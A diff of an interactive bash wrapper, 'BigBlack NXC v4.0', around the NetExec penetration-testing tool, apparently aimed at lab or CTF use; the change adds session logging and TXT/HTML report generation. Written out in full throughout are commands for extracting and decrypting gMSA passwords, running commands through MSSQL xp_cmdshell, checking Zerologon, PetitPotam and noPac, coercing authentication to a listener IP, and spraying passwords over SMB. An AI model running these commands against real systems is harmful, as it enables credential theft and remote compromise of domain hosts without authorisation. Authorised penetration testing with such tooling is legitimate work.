             echo -e "\n${YELLOW}[*] Custom LDAP Query${NC}"
@@ -676,7 +716,7 @@ run_advanced_ldap() {
             fi
             
             echo -e "\n${YELLOW}[*] Running custom query:${NC}"
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --query "$ldap_filter" "$ldap_attrs"
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --query "$ldap_filter" "$ldap_attrs"
             ;;
         9)
             return
@@ -691,6 +731,7 @@ run_advanced_ldap() {
 
 # Function for gMSA operations
 run_gmsa_ops() {
+    log_section "gMSA Operations | Target: $TARGET"
     echo -e "\n${GREEN}=== gMSA Operations (Group Managed Service Accounts) ===${NC}"
     
     if [ "$USERNAME" == "''" ]; then
@@ -710,24 +751,24 @@ run_gmsa_ops() {
     case $gmsa_choice in
         1)
             echo -e "\n${YELLOW}[*] Listing all gMSA accounts:${NC}"
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa
             ;;
         2)
             echo -e "\n${YELLOW}[*] Convert gMSA ID to password hash${NC}"
             read -p "Enter gMSA account ID: " gmsa_id
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_id"
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_id"
             ;;
         3)
             echo -e "\n${YELLOW}[*] Decrypt gMSA password from LSA${NC}"
             read -p "Enter gMSA account name: " gmsa_account
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_account"
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_account"
             ;;
         4)
             echo -e "\n${YELLOW}[*] Extracting all gMSA passwords...${NC}"
             
             # First list all gMSA accounts
             echo -e "\n${CYAN}Step 1: Listing gMSA accounts${NC}"
-            gmsa_output=$(netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa 2>&1)
+            gmsa_output=$(nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa 2>&1)
             echo "$gmsa_output"
             
             # Extract gMSA IDs and try to convert them
@@ -735,7 +776,7 @@ run_gmsa_ops() {
             echo "$gmsa_output" | grep -o "S-[0-9-]\+" | while read -r gmsa_sid; do
                 if [ ! -z "$gmsa_sid" ]; then
                     echo -e "\n${YELLOW}[*] Converting SID: $gmsa_sid${NC}"
-                    netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_sid"
+                    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_sid"
                 fi
             done
             
@@ -744,7 +785,7 @@ run_gmsa_ops() {
             echo "$gmsa_output" | grep -i "cn=" | grep -o "CN=[^,]*" | cut -d'=' -f2 | while read -r gmsa_name; do
                 if [ ! -z "$gmsa_name" ]; then
                     echo -e "\n${YELLOW}[*] Attempting LSA decryption for: $gmsa_name${NC}"
-                    netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_name"
+                    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_name"
                 fi
             done
             ;;
@@ -761,6 +802,7 @@ run_gmsa_ops() {
 
 # Function to run MSSQL enumeration
 run_mssql_enum() {
+    log_section "MSSQL Enumeration | Target: $TARGET"
     echo -e "\n${GREEN}=== Running MSSQL Enumeration ===${NC}"
     
     if [ "$USERNAME" == "''" ]; then
@@ -770,12 +812,12 @@ run_mssql_enum() {
     fi
     
     echo -e "\n${YELLOW}[*] MSSQL Authentication:${NC}"
-    netexec mssql "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH
+    nxcrun mssql "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH
     
     echo -e "\n${YELLOW}[*] Try to enable xp_cmdshell and run command:${NC}"
     read -p "Enter command to execute (or press Enter to skip): " cmd
     if [ ! -z "$cmd" ]; then
-        netexec mssql "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH -x "$cmd"
+        nxcrun mssql "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH -x "$cmd"
     fi
     
     read -p "Press Enter to continue..."
@@ -783,6 +825,7 @@ run_mssql_enum() {
 
 # Function to run FTP enumeration
 run_ftp_enum() {
+    log_section "FTP Enumeration | Target: $TARGET"
     echo -e "\n${GREEN}=== Running FTP Enumeration ===${NC}"
     
     if [ "$USERNAME" == "''" ]; then
@@ -792,11 +835,11 @@ run_ftp_enum() {
     fi
     
     echo -e "\n${YELLOW}[*] FTP Directory Listing:${NC}"
-    netexec ftp "$TARGET" -u "$USERNAME" -p "$PASSWORD" --ls
+    nxcrun ftp "$TARGET" -u "$USERNAME" -p "$PASSWORD" --ls
     
     read -p "Enter specific directory to list (or press Enter to skip): " ftp_dir
     if [ ! -z "$ftp_dir" ]; then
-        netexec ftp "$TARGET" -u "$USERNAME" -p "$PASSWORD" --ls "$ftp_dir"
+        nxcrun ftp "$TARGET" -u "$USERNAME" -p "$PASSWORD" --ls "$ftp_dir"
     fi
     
     read -p "Press Enter to continue..."
@@ -804,6 +847,7 @@ run_ftp_enum() {
 
 # Function to run vulnerability checks
 run_vuln_check() {
+    log_section "Vulnerability Checks | Target: $TARGET"
     echo -e "\n${GREEN}=== Running Vulnerability Checks ===${NC}"
     
     echo "Select vulnerability to check:"
@@ -815,18 +859,18 @@ run_vuln_check() {
     
     case $vuln_choice in
         1)
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
             ;;
         2)
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
             ;;
         3)
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
             ;;
         4)
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
             ;;
     esac
     
@@ -835,6 +879,7 @@ run_vuln_check() {
 
 # Function to run useful modules
 run_modules() {
+    log_section "Useful Modules | Target: $TARGET"
     echo -e "\n${GREEN}=== Running Useful Modules ===${NC}"
     
     if [ "$USERNAME" == "''" ]; then
@@ -854,25 +899,25 @@ run_modules() {
     
     case $module_choice in
         1)
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
             ;;
         2)
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
             ;;
         3)
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M slinky
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M slinky
             ;;
         4)
             read -p "Enter listener IP (tun0 IP): " listener_ip
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M coerce_plus -o LISTENER=$listener_ip
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M coerce_plus -o LISTENER=$listener_ip
             ;;
         5)
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
             ;;
         6)
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
             ;;
     esac
     
@@ -881,6 +926,7 @@ run_modules() {
 
 # Function to run password spraying
 run_spray() {
+    log_section "Password Spraying | Target: $TARGET"
     echo -e "\n${GREEN}=== Running Password Spraying ===${NC}"
     
     echo "Password spraying options:"
@@ -892,12 +938,12 @@ run_spray() {
         1)
             read -p "Enter path to userlist file: " userlist
             read -p "Enter password to spray: " spray_pass
-            netexec smb "$TARGET" -u "$userlist" -p "$spray_pass" $DOMAIN_OPTION --continue-on-success
+            nxcrun smb "$TARGET" -u "$userlist" -p "$spray_pass" $DOMAIN_OPTION --continue-on-success
             ;;
         2)
             read -p "Enter path to userlist file: " userlist
             read -p "Enter path to password list: " passlist
-            netexec smb "$TARGET" -u "$userlist" -p "$passlist" $DOMAIN_OPTION --no-bruteforce --continue-on-success
+            nxcrun smb "$TARGET" -u "$userlist" -p "$passlist" $DOMAIN_OPTION --no-bruteforce --continue-on-success
             ;;
     esac
     
@@ -935,6 +981,159 @@ change_settings() {
     get_credentials
 }
 
+# Generate TXT and HTML reports from session log
+generate_report() {
+    local end_time
+    end_time=$(date '+%Y-%m-%d %H:%M:%S')
+    local start_time
+    start_time=$(grep "SESSION_START=" "$LOG_FILE" | cut -d= -f2)
+    local cmd_count
+    cmd_count=$(grep -c "^\[.*\] CMD:" "$LOG_FILE" 2>/dev/null || echo 0)
+
+    echo -e "\n${CYAN}[*] Generating reports...${NC}"
+
+    # ── TXT Report ──────────────────────────────────────────────
+    {
+        echo "========================================================"
+        echo "  BigBlack NXC — Session Report"
+        echo "========================================================"
+        echo "  Target   : $TARGET"
+        echo "  Username : $USERNAME"
+        echo "  Domain   : ${DOMAIN:-Not set}"
+        echo "  Start    : $start_time"
+        echo "  End      : $end_time"
+        echo "  Commands : $cmd_count"
+        echo "  Log file : $LOG_FILE"
+        echo "========================================================"
+        echo ""
+        # Print each command block
+        while IFS= read -r line; do
+            if [[ "$line" =~ ^\[.*\]\ CMD: ]]; then
+                echo ""
+                echo "──────────────────────────────────────────────────────"
+                echo "  $line"
+                echo "──────────────────────────────────────────────────────"
+            elif [[ "$line" =~ ^════ ]]; then
+                echo ""
+                echo "$line"
+            else
+                echo "$line"
+            fi
+        done < <(grep -v "^SESSION_START\|^HOSTNAME\|^USER_RUNNING" "$LOG_FILE")
+        echo ""
+        echo "========================================================"
+        echo "  End of Report"
+        echo "========================================================"
+    } > "$REPORT_TXT"
+
+    # ── HTML Report ──────────────────────────────────────────────
+    {
+        cat <<HTMLEOF
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<title>BigBlack NXC Report — $TARGET</title>
+<style>
+  :root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--accent:#58a6ff;
+        --green:#3fb950;--yellow:#d29922;--red:#f85149;--cyan:#39c5cf;
+        --text:#c9d1d9;--muted:#8b949e;}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:'Cascadia Code','Fira Code',monospace;
+       font-size:13px;line-height:1.6;padding:24px}
+  header{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+         padding:24px 28px;margin-bottom:20px}
+  header h1{font-size:22px;color:var(--accent);margin-bottom:6px}
+  .meta{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;margin-top:12px}
+  .meta-item{background:#21262d;border-radius:6px;padding:8px 12px;font-size:12px}
+  .meta-item span{color:var(--muted);display:block;font-size:10px;text-transform:uppercase;
+                  letter-spacing:.5px;margin-bottom:2px}
+  .section{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+           margin-bottom:12px;overflow:hidden}
+  .section-header{background:#21262d;padding:8px 16px;font-size:11px;
+                  color:var(--cyan);font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+  .cmd-block{border-bottom:1px solid var(--border);padding:10px 16px}
+  .cmd-block:last-child{border-bottom:none}
+  .cmd-line{color:var(--yellow);font-weight:600;margin-bottom:6px;font-size:12px}
+  .cmd-line::before{content:"$ ";color:var(--green)}
+  .output{color:var(--text);white-space:pre-wrap;word-break:break-all;
+          font-size:11.5px;padding-left:16px;border-left:2px solid var(--border)}
+  .no-output{color:var(--muted);font-size:11px;padding-left:16px;font-style:italic}
+  footer{margin-top:20px;text-align:center;color:var(--muted);font-size:11px}
+</style>
+</head>
+<body>
+<header>
+  <h1>BigBlack NXC — Session Report</h1>
+  <div class="meta">
+    <div class="meta-item"><span>Target</span>$TARGET</div>
+    <div class="meta-item"><span>Username</span>${USERNAME}</div>
+    <div class="meta-item"><span>Domain</span>${DOMAIN:-Not set}</div>
+    <div class="meta-item"><span>Start</span>$start_time</div>
+    <div class="meta-item"><span>End</span>$end_time</div>
+    <div class="meta-item"><span>Commands Run</span>$cmd_count</div>
+  </div>
+</header>
+HTMLEOF
+
+        # Parse log into HTML sections
+        current_section=""
+        in_cmd=0
+        cmd_text=""
+        output_lines=()
+
+        flush_cmd() {
+            if [ -n "$cmd_text" ]; then
+                echo '<div class="cmd-block">'
+                echo "<div class=\"cmd-line\">$(printf '%s' "$cmd_text" | sed 's/.*CMD: //' | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
+                if [ ${#output_lines[@]} -gt 0 ]; then
+                    echo '<div class="output">'
+                    for ol in "${output_lines[@]}"; do
+                        printf '%s\n' "$ol" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g'
+                    done
+                    echo '</div>'
+                else
+                    echo '<div class="no-output">(no output captured)</div>'
+                fi
+                echo '</div>'
+                cmd_text=""
+                output_lines=()
+            fi
+        }
+
+        while IFS= read -r line; do
+            if [[ "$line" =~ ^SESSION_START|^HOSTNAME|^USER_RUNNING ]]; then
+                continue
+            elif [[ "$line" =~ ^════ ]]; then
+                continue
+            elif [[ "$line" =~ ^\ \ (.+)\ \|\ Target ]]; then
+                flush_cmd
+                if [ -n "$current_section" ]; then echo '</div>'; fi
+                section_name="${BASH_REMATCH[1]}"
+                current_section="$section_name"
+                echo '<div class="section">'
+                echo "<div class=\"section-header\">$section_name</div>"
+            elif [[ "$line" =~ ^\[.*\]\ CMD:\ (.*) ]]; then
+                flush_cmd
+                cmd_text="$line"
+            elif [ -n "$cmd_text" ]; then
+                output_lines+=("$line")
+            fi
+        done < "$LOG_FILE"
+
+        flush_cmd
+        if [ -n "$current_section" ]; then echo '</div>'; fi
+
+        echo '<footer>BigBlack NXC v4.0 &mdash; Report generated '"$end_time"'</footer>'
+        echo '</body></html>'
+    } > "$REPORT_HTML"
+
+    echo -e "${GREEN}[+] Reports saved:${NC}"
+    echo -e "    TXT  : ${CYAN}$REPORT_TXT${NC}"
+    echo -e "    HTML : ${CYAN}$REPORT_HTML${NC}"
+    echo -e "    LOG  : ${CYAN}$LOG_FILE${NC}"
+}
+
 # Main loop
 while true; do
     print_banner
@@ -964,7 +1163,8 @@ while true; do
         14) run_gmsa_ops ;;
         15) run_advanced_ldap ;;
         16) run_hash_check ;;
-        0) 
+        0)
+            generate_report
             echo -e "${GREEN}Goodbye!${NC}"
             exit 0
             ;;
